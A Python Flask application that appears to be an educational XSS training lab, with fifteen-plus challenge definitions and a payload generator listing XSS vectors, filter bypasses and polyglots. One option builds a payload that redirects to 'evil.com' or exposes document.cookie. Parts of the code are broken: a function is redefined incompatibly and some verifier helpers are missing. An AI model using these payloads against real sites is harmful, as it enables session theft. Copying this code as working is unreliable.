#!/usr/bin/env python3
"""
Production-Ready XSS Playground - Educational Security Laboratory

A comprehensive, secure XSS playground with sandboxed challenge labs,
advanced payload generation, and production-grade security measures.

Features:
- 15+ Sandboxed XSS Challenge Labs
- Context-Aware Payload Generator
- CSP-Based Security Controls
- Challenge Progress Tracking
- Advanced Logging & Analytics
- Production Security Headers
"""

import os
import html
import json
import logging
import hashlib
import secrets
import re
from datetime import datetime, timedelta
from functools import wraps
from typing import Dict, List, Optional, Tuple
from flask import (
    Flask, render_template, request, jsonify, session, 
    redirect, url_for, flash, make_response, abort
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", secrets.token_hex(32))

# Production Security Headers
@app.after_request
def add_security_headers(response):
    """Add production security headers"""
    # Basic security headers
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    
    # HSTS for HTTPS (commented for development)
    # response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'
    
    return response

# In-memory storage (production would use proper database)
user_progress = {}
challenge_logs = []
xss_payload_logs = []
analytics_data = {
    'total_attempts': 0,
    'successful_exploits': 0,
    'unique_payloads': set(),
    'challenge_completions': {},
    'user_sessions': set()
}

# Challenge Definitions - Comprehensive Lab Structure
CHALLENGE_LABS = {
    # Beginner Labs (1-5)
    1: {
        'title': 'Reflected XSS - Basic',
        'category': 'Reflected XSS',
        'difficulty': 'Easy',
        'points': 100,
        'description': 'Execute JavaScript through URL parameter reflection',
        'objective': 'Make the application execute alert("XSS") via the search parameter',
        'hint': 'The search query is directly reflected in the response without sanitization',
        'vulnerability': 'search_reflection',
        'context': 'html_content',
        'filters': [],
        'solution_pattern': r'alert\(["\']XSS["\']\)',
        'lab_url': '/lab/reflected-basic',
        'csp_policy': None,  # No CSP for basic lab
        'sandbox': 'allow-scripts allow-same-origin'
    },
    
    2: {
        'title': 'Reflected XSS - Attribute Context',
        'category': 'Reflected XSS',
        'difficulty': 'Easy',
        'points': 150,
        'description': 'Break out of HTML attribute context to execute JavaScript',
        'objective': 'Execute JavaScript when input is reflected in an HTML attribute',
        'hint': 'You need to close the attribute and break out of the tag context',
        'vulnerability': 'attribute_injection',
        'context': 'html_attribute',
        'filters': [],
        'solution_pattern': r'["\'].*>.*<script.*alert.*</script>',
        'lab_url': '/lab/reflected-attribute',
        'csp_policy': None,
        'sandbox': 'allow-scripts allow-same-origin'
    },
    
    3: {
        'title': 'Stored XSS - Comment System',
        'category': 'Stored XSS',
        'difficulty': 'Easy',
        'points': 200,
        'description': 'Store malicious JavaScript in application data',
        'objective': 'Store XSS payload that executes when other users view comments',
        'hint': 'Comments are stored and displayed without proper sanitization',
        'vulnerability': 'stored_comment',
        'context': 'html_content',
        'filters': [],
        'solution_pattern': r'<script.*alert.*</script>',
        'lab_url': '/lab/stored-comments',
        'csp_policy': None,
        'sandbox': 'allow-scripts allow-same-origin allow-forms'
    },
    
    4: {
        'title': 'DOM XSS - URL Fragment',
        'category': 'DOM XSS',
        'difficulty': 'Medium',
        'points': 250,
        'description': 'Exploit client-side JavaScript URL processing',
        'objective': 'Execute JavaScript through DOM manipulation via URL fragment',
        'hint': 'The application processes location.hash without sanitization',
        'vulnerability': 'dom_hash',
        'context': 'javascript',
        'filters': [],
        'solution_pattern': r'alert\(["\']XSS["\']\)',
        'lab_url': '/lab/dom-hash',
        'csp_policy': None,
        'sandbox': 'allow-scripts allow-same-origin'
    },
    
    5: {
        'title': 'XSS via JavaScript Template',
        'category': 'Template XSS',
        'difficulty': 'Medium',
        'points': 300,
        'description': 'Exploit server-side template injection leading to XSS',
        'objective': 'Execute JavaScript through template engine vulnerability',
        'hint': 'The template engine processes user input without escaping',
        'vulnerability': 'template_injection',
        'context': 'template',
        'filters': [],
        'solution_pattern': r'alert\(["\']XSS["\']\)',
        'lab_url': '/lab/template-xss',
        'csp_policy': None,
        'sandbox': 'allow-scripts allow-same-origin'
    },
    
    # Intermediate Labs (6-10)
    6: {
        'title': 'Filter Bypass - Script Tag Blocked',
        'category': 'Filter Bypass',
        'difficulty': 'Medium',
        'points': 350,
        'description': 'Bypass script tag filtering using alternative vectors',
        'objective': 'Execute JavaScript when <script> tags are filtered',
        'hint': 'Try using event handlers or other HTML elements',
        'vulnerability': 'script_filter',
        'context': 'html_content',
        'filters': ['script_tag'],
        'solution_pattern': r'(on\w+\s*=|<img.*onerror|<svg.*onload)',
        'lab_url': '/lab/filter-script',
        'csp_policy': None,
        'sandbox': 'allow-scripts allow-same-origin'
    },
    
    7: {
        'title': 'Filter Bypass - Keyword Filtering',
        'category': 'Filter Bypass',
        'difficulty': 'Medium',
        'points': 400,
        'description': 'Bypass keyword-based XSS filters',
        'objective': 'Execute alert() when keywords like "alert", "script" are filtered',
        'hint': 'Use encoding, case variations, or JavaScript alternatives',
        'vulnerability': 'keyword_filter',
        'context': 'html_content',
        'filters': ['keywords'],
        'solution_pattern': r'(String\.fromCharCode|eval|Function|this\[.*\])',
        'lab_url': '/lab/filter-keywords',
        'csp_policy': None,
        'sandbox': 'allow-scripts allow-same-origin'
    },
    
    8: {
        'title': 'Filter Bypass - Attribute Whitelist',
        'category': 'Filter Bypass',
        'difficulty': 'Medium',
        'points': 450,
        'description': 'Bypass attribute-based XSS protection',
        'objective': 'Execute JavaScript when only certain attributes are allowed',
        'hint': 'Find creative ways to use whitelisted attributes',
        'vulnerability': 'attribute_whitelist',
        'context': 'html_attribute',
        'filters': ['attribute_whitelist'],
        'solution_pattern': r'(style=.*expression|background.*javascript:|@import)',
        'lab_url': '/lab/filter-attributes',
        'csp_policy': None,
        'sandbox': 'allow-scripts allow-same-origin'
    },
    
    9: {
        'title': 'DOM XSS - JSON Injection',
        'category': 'DOM XSS',
        'difficulty': 'Medium',
        'points': 500,
        'description': 'Exploit JSON parsing vulnerabilities',
        'objective': 'Break out of JSON context to execute JavaScript',
        'hint': 'JSON parsing can be exploited if not properly handled',
        'vulnerability': 'json_injection',
        'context': 'json',
        'filters': [],
        'solution_pattern': r'</script>.*<script.*alert',
        'lab_url': '/lab/dom-json',
        'csp_policy': None,
        'sandbox': 'allow-scripts allow-same-origin'
    },
    
    10: {
        'title': 'XSS via File Upload',
        'category': 'File Upload XSS',
        'difficulty': 'Hard',
        'points': 600,
        'description': 'Exploit file upload functionality for XSS',
        'objective': 'Upload a file that executes JavaScript when viewed',
        'hint': 'File uploads can be exploited through various vectors',
        'vulnerability': 'file_upload',
        'context': 'file_content',
        'filters': ['file_extension'],
        'solution_pattern': r'<script.*alert.*</script>',
        'lab_url': '/lab/upload-xss',
        'csp_policy': None,
        'sandbox': 'allow-scripts allow-same-origin allow-forms'
    },
    
    # Advanced Labs (11-15)
    11: {
        'title': 'CSP Bypass - Unsafe Inline',
        'category': 'CSP Bypass',
        'difficulty': 'Hard',
        'points': 700,
        'description': 'Bypass Content Security Policy with unsafe-inline',
        'objective': 'Execute JavaScript despite CSP restrictions',
        'hint': 'Look for CSP misconfigurations or whitelisted sources',
        'vulnerability': 'csp_unsafe_inline',
        'context': 'html_content',
        'filters': ['csp'],
        'solution_pattern': r'<script.*alert.*</script>',
        'lab_url': '/lab/csp-unsafe-inline',
        'csp_policy': "default-src 'self'; script-src 'self' 'unsafe-inline'",
        'sandbox': 'allow-scripts allow-same-origin'
    },
    
    12: {
        'title': 'CSP Bypass - JSONP Abuse',
        'category': 'CSP Bypass',
        'difficulty': 'Hard',
        'points': 800,
        'description': 'Abuse JSONP endpoints to bypass CSP',
        'objective': 'Use whitelisted JSONP endpoints for XSS execution',
        'hint': 'JSONP callbacks can be exploited for CSP bypass',
        'vulnerability': 'jsonp_abuse',
        'context': 'jsonp',
        'filters': ['csp_strict'],
        'solution_pattern': r'callback.*alert',
        'lab_url': '/lab/csp-jsonp',
        'csp_policy': "default-src 'self'; script-src 'self' https://api.example.com",
        'sandbox': 'allow-scripts allow-same-origin'
    },
    
    13: {
        'title': 'Mutation XSS - DOM Clobbering',
        'category': 'Mutation XSS',
        'difficulty': 'Hard',
        'points': 900,
        'description': 'Exploit DOM mutations and clobbering',
        'objective': 'Use DOM clobbering to achieve XSS execution',
        'hint': 'DOM clobbering can override JavaScript variables',
        'vulnerability': 'dom_clobbering',
        'context': 'dom_mutation',
        'filters': ['mutation_observer'],
        'solution_pattern': r'(id=.*window\.|name=.*document\.)',
        'lab_url': '/lab/mutation-xss',
        'csp_policy': "default-src 'self'; script-src 'self'",
        'sandbox': 'allow-scripts allow-same-origin'
    },
    
    14: {
        'title': 'Prototype Pollution XSS',
        'category': 'Advanced XSS',
        'difficulty': 'Expert',
        'points': 1000,
        'description': 'Chain prototype pollution with XSS',
        'objective': 'Use prototype pollution to enable XSS execution',
        'hint': 'Prototype pollution can affect sanitization functions',
        'vulnerability': 'prototype_pollution',
        'context': 'javascript_prototype',
        'filters': ['prototype_protection'],
        'solution_pattern': r'__proto__|constructor\.prototype',
        'lab_url': '/lab/prototype-xss',
        'csp_policy': "default-src 'self'; script-src 'self'",
        'sandbox': 'allow-scripts allow-same-origin'
    },
    
    15: {
        'title': 'Universal XSS - Polyglot Attack',
        'category': 'Universal XSS',
        'difficulty': 'Expert',
        'points': 1200,
        'description': 'Create universal polyglot XSS payload',
        'objective': 'Craft payload that works in multiple contexts',
        'hint': 'Polyglot payloads work across different injection points',
        'vulnerability': 'polyglot_universal',
        'context': 'multiple',
        'filters': ['comprehensive'],
        'solution_pattern': r'javascript:|<script|on\w+\s*=',
        'lab_url': '/lab/polyglot-xss',
        'csp_policy': "default-src 'self'; script-src 'self' 'unsafe-eval'",
        'sandbox': 'allow-scripts allow-same-origin'
    }
}

# Add configuration for advanced labs
ADVANCED_LABS = {
    'dom-clobbering': {
        'title': 'DOM Clobbering Advanced Lab',
        'category': 'Advanced DOM',
        'difficulty': 'Expert',
        'points': 500,
        'checkpoints': [
            'basic-clobbering',
            'property-collision',
            'prototype-pollution'
        ],
        'csp_policy': "default-src 'self'; script-src 'nonce-{nonce}' 'strict-dynamic'",
        'sandbox': 'allow-scripts allow-same-origin'
    },
    'filter-bypass': {
        'title': 'Advanced Filter Bypass Lab',
        'category': 'Filter Evasion',
        'difficulty': 'Expert',
        'points': 450,
        'checkpoints': [
            'regex-bypass',
            'waf-evasion',
            'encoding-tricks'
        ],
        'csp_policy': None,
        'sandbox': 'allow-scripts allow-same-origin'
    },
    'framework-xss': {
        'title': 'Modern Framework XSS',
        'category': 'Framework Security',
        'difficulty': 'Expert',
        'points': 600,
        'checkpoints': [
            'react-xss',
            'angular-template-injection',
            'vue-template-xss'
        ],
        'csp_policy': "default-src 'self'; script-src 'nonce-{nonce}' 'unsafe-eval'",
        'sandbox': 'allow-scripts allow-same-origin'
    }
}

# Update the CHALLENGE_LABS dictionary
CHALLENGE_LABS.update(ADVANCED_LABS)

# Payload Generation Templates
PAYLOAD_TEMPLATES = {
    'html_content': [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<iframe src=javascript:alert("XSS")>',
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>XSS</marquee>'
    ],
    'html_attribute': [
        '" onmouseover="alert(\'XSS\')" "',
        '"><script>alert("XSS")</script>',
        '" autofocus onfocus="alert(\'XSS\')" "',
        '"><img src=x onerror=alert("XSS")>',
        '" style="background:url(javascript:alert(\'XSS\'))" "'
    ],
    'javascript': [
        '\";alert(\"XSS\");//',
        '\'+alert(\"XSS\")+\'',
        '</script><script>alert("XSS")</script>',
        '\\x3cscript\\x3ealert("XSS")\\x3c/script\\x3e',
        'String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41)'
    ],
    'url': [
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        'vbscript:alert("XSS")',
        'mhtml:http://example.com/xss.html!xss',
        'jar:http://example.com/xss.jar!/xss.html'
    ],
    'css': [
        'expression(alert("XSS"))',
        'url(javascript:alert("XSS"))',
        'url(data:text/html,<script>alert("XSS")</script>)',
        '@import url(javascript:alert("XSS"))',
        'background:url(vbscript:alert("XSS"))'
    ]
}

def get_user_session_id():
    """Generate or retrieve user session ID"""
    if 'session_id' not in session:
        session['session_id'] = secrets.token_hex(16)
        session['created_at'] = datetime.now().isoformat()
        analytics_data['user_sessions'].add(session['session_id'])
    return session['session_id']

def log_challenge_attempt(challenge_id: int, payload: str, success: bool = False):
    """Log challenge attempt for analytics"""
    session_id = get_user_session_id()
    
    log_entry = {
        'timestamp': datetime.now().isoformat(),
        'session_id': session_id,
        'challenge_id': challenge_id,
        'payload': payload,
        'success': success,
        'ip_address': request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr),
        'user_agent': request.headers.get('User-Agent', '')
    }
    
    challenge_logs.append(log_entry)
    analytics_data['total_attempts'] += 1
    
    if success:
        analytics_data['successful_exploits'] += 1
        analytics_data['challenge_completions'][challenge_id] = analytics_data['challenge_completions'].get(challenge_id, 0) + 1
    
    analytics_data['unique_payloads'].add(payload)
    
    logger.info(f"Challenge {challenge_id} attempt: {success} - Session: {session_id}")

def update_user_progress(challenge_id: int, solved: bool = True):
    """Update user progress for a challenge"""
    session_id = get_user_session_id()
    
    if session_id not in user_progress:
        user_progress[session_id] = {}
    
    if str(challenge_id) not in user_progress[session_id]:
        user_progress[session_id][str(challenge_id)] = {
            'attempts': 0,
            'solved': False,
            'first_solved': None,
            'points_earned': 0
        }
    
    user_progress[session_id][str(challenge_id)]['attempts'] += 1
    
    if solved and not user_progress[session_id][str(challenge_id)]['solved']:
        user_progress[session_id][str(challenge_id)]['solved'] = True
        user_progress[session_id][str(challenge_id)]['first_solved'] = datetime.now().isoformat()
        user_progress[session_id][str(challenge_id)]['points_earned'] = CHALLENGE_LABS[challenge_id]['points']

def get_user_stats(session_id: str) -> Dict:
    """Get comprehensive user statistics"""
    progress = user_progress.get(session_id, {})
    
    total_challenges = len(CHALLENGE_LABS)
    solved_challenges = len([c for c in progress.values() if c.get('solved', False)])
    total_points = sum(c.get('points_earned', 0) for c in progress.values())
    total_attempts = sum(c.get('attempts', 0) for c in progress.values())
    
    return {
        'total_challenges': total_challenges,
        'solved_challenges': solved_challenges,
        'total_points': total_points,
        'total_attempts': total_attempts,
        'completion_rate': round((solved_challenges / total_challenges) * 100, 1) if total_challenges > 0 else 0,
        'average_attempts': round(total_attempts / total_challenges, 1) if total_challenges > 0 else 0,
    }

# Routes
@app.route('/')
def dashboard():
    """Enhanced dashboard with comprehensive statistics"""
    session_id = get_user_session_id()
    progress = user_progress.get(session_id, {})
    stats = get_user_stats(session_id)
    
    # Prepare challenge data
    challenge_list = []
    for challenge_id, challenge in CHALLENGE_LABS.items():
        challenge_info = challenge.copy()
        challenge_info['id'] = challenge_id
        challenge_info['solved'] = progress.get(str(challenge_id), {}).get('solved', False)
        challenge_info['attempts'] = progress.get(str(challenge_id), {}).get('attempts', 0)
        challenge_info['points_earned'] = progress.get(str(challenge_id), {}).get('points_earned', 0)
        challenge_list.append(challenge_info)
    
    # Group challenges by category
    categories = {}
    for challenge in challenge_list:
        category = challenge['category']
        if category not in categories:
            categories[category] = []
        categories[category].append(challenge)
    
    return render_template('dashboard_production.html', 
                         challenges=challenge_list,
                         categories=categories,
                         stats=stats,
                         security_mode=session.get('security_mode', 'vulnerable'))

@app.route('/challenge/<int:challenge_id>')
def challenge(challenge_id):
    """Individual challenge page with universal template"""
    if challenge_id not in CHALLENGE_LABS:
        abort(404)
    
    session_id = get_user_session_id()
    progress = user_progress.get(session_id, {})
    
    challenge = CHALLENGE_LABS[challenge_id].copy()
    challenge['id'] = challenge_id
    challenge['solved'] = progress.get(str(challenge_id), {}).get('solved', False)
    challenge['attempts'] = progress.get(str(challenge_id), {}).get('attempts', 0)
    challenge['show_hint'] = challenge['attempts'] >= 3 or challenge['solved']
    
    # Use universal challenge template for all challenges
    return render_template('universal_challenge.html',
                         challenge=challenge,
                         security_mode=session.get('security_mode', 'vulnerable'))

@app.route('/challenge/<int:challenge_id>/submit', methods=['POST'])
def submit_challenge(challenge_id):
    """Handle challenge submission with validation"""
    if challenge_id not in CHALLENGE_LABS:
        return jsonify({'success': False, 'error': 'Invalid challenge'})
    
    payload = request.form.get('payload', '').strip()
    if not payload:
        return jsonify({'success': False, 'error': 'No payload provided'})
    
    challenge = CHALLENGE_LABS[challenge_id]
    success = False
    
    # Validate solution based on challenge type
    if re.search(challenge['solution_pattern'], payload, re.IGNORECASE):
        success = True
        
        # Find next challenge - Filter and sort only numeric challenge IDs
        numeric_challenges = sorted([
            cid for cid in CHALLENGE_LABS.keys() 
            if isinstance(cid, int)
        ])
        
        next_challenge_id = None
        if numeric_challenges:
            current_index = numeric_challenges.index(challenge_id)
            if current_index < len(numeric_challenges) - 1:
                next_challenge_id = numeric_challenges[current_index + 1]
        
        # Update progress with completed checkpoint
        update_user_progress(
            session.get('user_id', get_user_session_id()),
            challenge_id,
            'completed'
        )
        
        log_challenge_attempt(challenge_id, payload, success)
        
        return jsonify({
            'success': True,
            'points': challenge['points'],
            'message': 'Challenge completed successfully!',
            'next_challenge': f'/challenge/{next_challenge_id}' if next_challenge_id else '/dashboard',
            'redirect': True
        })
    
    # Update progress for failed attempt
    update_user_progress(
        session.get('user_id', get_user_session_id()),
        challenge_id,
        'attempted'
    )
    log_challenge_attempt(challenge_id, payload, success)
    
    return jsonify({
        'success': False,
        'message': 'Try again! Keep experimenting with different payloads.',
        'redirect': False
    })

@app.route('/lab/<path:lab_path>')
def lab_interface(lab_path):
    """Sandboxed lab interface for safe XSS testing"""
    # Find challenge by lab_url
    challenge_id = None
    for cid, challenge in CHALLENGE_LABS.items():
        if challenge['lab_url'] == f'/lab/{lab_path}':
            challenge_id = cid
            break
    
    if not challenge_id:
        abort(404)
    
    challenge = CHALLENGE_LABS[challenge_id]
    
    # Create sandboxed response
    response = make_response(render_template(f'labs/{lab_path}.html', 
                                           challenge=challenge,
                                           security_mode=session.get('security_mode', 'vulnerable')))
    
    # Apply CSP if specified
    if challenge['csp_policy']:
        response.headers['Content-Security-Policy'] = challenge['csp_policy']
    
    # Apply sandbox attributes
    if challenge['sandbox']:
        response.headers['X-Frame-Options'] = f'SAMEORIGIN; sandbox="{challenge["sandbox"]}"'
    
    return response

@app.route('/payload-generator')
def payload_generator():
    """Advanced payload generator interface"""
    return render_template('payload_generator_production.html')

@app.route('/generate-payload', methods=['POST'])
def generate_payload():
    """Generate context-aware XSS payloads"""
    context = request.form.get('context', 'html')
    filter_type = request.form.get('filter', 'none')
    target = request.form.get('target', 'alert')
    obfuscated = request.form.get('obfuscated') == 'true'
    encoded = request.form.get('encoded') == 'true'
    polyglot = request.form.get('polyglot') == 'true'
    
    payloads = []
    
    # Get base payloads for context
    base_payloads = PAYLOAD_TEMPLATES.get(context, PAYLOAD_TEMPLATES['html_content'])
    
    for base_payload in base_payloads:
        # Customize payload based on target
        if target == 'console.log':
            payload = base_payload.replace('alert("XSS")', 'console.log("XSS")')
        elif target == 'document.cookie':
            payload = base_payload.replace('alert("XSS")', 'alert(document.cookie)')
        elif target == 'fetch':
            payload = base_payload.replace('alert("XSS")', 'fetch("/log", {method:"POST", body:"XSS"})')
        elif target == 'location.href':
            payload = base_payload.replace('alert("XSS")', 'location.href="http://evil.com"')
        elif target == 'eval':
            payload = base_payload.replace('alert("XSS")', 'eval("alert(\\"XSS\\")")')
        else:
            payload = base_payload
        
        # Apply filter bypasses
        if filter_type == 'script_blocked':
            payload = payload.replace('<script>', '<ScRiPt>').replace('</script>', '</ScRiPt>')
        elif filter_type == 'quotes_filtered':
            payload = payload.replace('"', '&#34;').replace("'", '&#39;')
        elif filter_type == 'keywords_filtered':
            payload = payload.replace('alert', 'top["ale"+"rt"]')
        
        # Apply obfuscation
        if obfuscated:
            payload = payload.replace('alert', 'window["ale"+"rt"]')
            payload = payload.replace('script', 'scr"+"ipt')
        
        # Apply encoding
        if encoded:
            payload = html.escape(payload)
        
        payloads.append(payload)
    
    # Add polyglot payloads if requested
    if polyglot:
        polyglot_payloads = [
            'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html onmouseover=/*&lt;svg/*/onload=alert()//>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '\'-alert(String.fromCharCode(88,83,83))-\'',
            '</script><script>alert(String.fromCharCode(88,83,83))</script>',
        ]
        payloads.extend(polyglot_payloads)
    
    return jsonify({'payloads': payloads[:20]})  # Limit to 20 payloads

@app.route('/toggle-security', methods=['POST'])
def toggle_security():
    """Toggle between secure and vulnerable modes"""
    current_mode = session.get('security_mode', 'vulnerable')
    new_mode = 'secure' if current_mode == 'vulnerable' else 'vulnerable'
    session['security_mode'] = new_mode
    
    return jsonify({
        'success': True,
        'mode': new_mode,
        'message': f'Switched to {new_mode} mode'
    })

@app.route('/log', methods=['POST'])
def log_payload():
    """Log XSS payload execution for analytics"""
    try:
        data = request.get_json()
        if not data:
            return jsonify({'success': False})
        
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'session_id': get_user_session_id(),
            'type': data.get('type', 'unknown'),
            'payload': data.get('payload', ''),
            'challenge_id': data.get('challenge_id'),
            'url': data.get('url', ''),
            'ip_address': request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr),
            'user_agent': request.headers.get('User-Agent', '')
        }
        
        xss_payload_logs.append(log_entry)
        return jsonify({'success': True})
        
    except Exception as e:
        logger.error(f"Error logging payload: {e}")
        return jsonify({'success': False})

@app.route('/analytics')
def analytics():
    """Analytics dashboard for administrators"""
    session_id = get_user_session_id()
    user_stats = get_user_stats(session_id)
    
    # Global analytics
    global_stats = {
        'total_users': len(analytics_data['user_sessions']),
        'total_attempts': analytics_data['total_attempts'],
        'successful_exploits': analytics_data['successful_exploits'],
        'unique_payloads': len(analytics_data['unique_payloads']),
        'success_rate': round((analytics_data['successful_exploits'] / max(analytics_data['total_attempts'], 1)) * 100, 1),
        'challenge_completions': analytics_data['challenge_completions']
    }
    
    return render_template('analytics.html', 
                         user_stats=user_stats,
                         global_stats=global_stats,
                         recent_logs=challenge_logs[-50:])

@app.route('/help')
def help_page():
    """Comprehensive help and documentation"""
    return render_template('help.html', challenges=CHALLENGE_LABS)

@app.route('/reset-progress', methods=['POST'])
def reset_progress():
    """Reset user progress"""
    session_id = get_user_session_id()
    if session_id in user_progress:
        del user_progress[session_id]
    
    return jsonify({'success': True, 'message': 'Progress reset successfully'})

@app.route('/api/verify-challenge', methods=['POST'])
def verify_challenge():
    """Verify challenge completion and update progress"""
    try:
        data = request.get_json()
        challenge_id = data.get('challengeId')
        payload = data.get('payload')
        checkpoint = data.get('checkpoint')
        
        if not all([challenge_id, payload, checkpoint]):
            return jsonify({'error': 'Missing required fields'}), 400
            
        challenge = CHALLENGE_LABS.get(challenge_id)
        if not challenge:
            return jsonify({'error': 'Invalid challenge'}), 404
            
        # Verify the challenge solution
        success = verify_solution(challenge, payload, checkpoint)
        
        if success:
            # Update progress
            user_id = session.get('user_id')
            if user_id:
                update_user_progress(user_id, challenge_id, checkpoint)
                
            return jsonify({
                'success': True,
                'points': challenge['points'],
                'message': 'Challenge completed successfully!'
            })
        
        return jsonify({
            'success': False,
            'message': 'Solution incorrect. Try again!'
        })
        
    except Exception as e:
        logger.error(f"Challenge verification error: {e}")
        return jsonify({'error': 'Verification failed'}), 500

def verify_solution(challenge, payload, checkpoint):
    """Verify if the submitted solution is correct"""
    # Implementation specific to each challenge type
    if challenge['category'] == 'Advanced DOM':
        return verify_dom_clobbering(payload, checkpoint)
    elif challenge['category'] == 'Filter Evasion':
        return verify_filter_bypass(payload, checkpoint)
    elif challenge['category'] == 'Framework Security':
        return verify_framework_xss(payload, checkpoint)
    return False

def update_user_progress(user_id, challenge_id, checkpoint):
    """Update user's progress for the challenge"""
    if not user_id:
        user_id = get_user_session_id()
        
    if user_id not in user_progress:
        user_progress[user_id] = {'labProgress': {}}
        
    if challenge_id not in user_progress[user_id]['labProgress']:
        user_progress[user_id]['labProgress'][challenge_id] = {
            'completed': False,
            'checkpoints': [],
            'timestamp': datetime.now().isoformat(),
            'score': 0,
            'attempts': 0
        }
        
    progress = user_progress[user_id]['labProgress'][challenge_id]
    progress['attempts'] += 1
    
    if checkpoint == 'completed':
        progress['completed'] = True
        if 'completed' not in progress['checkpoints']:
            progress['checkpoints'].append('completed')
            progress['score'] = CHALLENGE_LABS[challenge_id]['points']
    elif checkpoint not in progress['checkpoints']:
        progress['checkpoints'].append(checkpoint)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)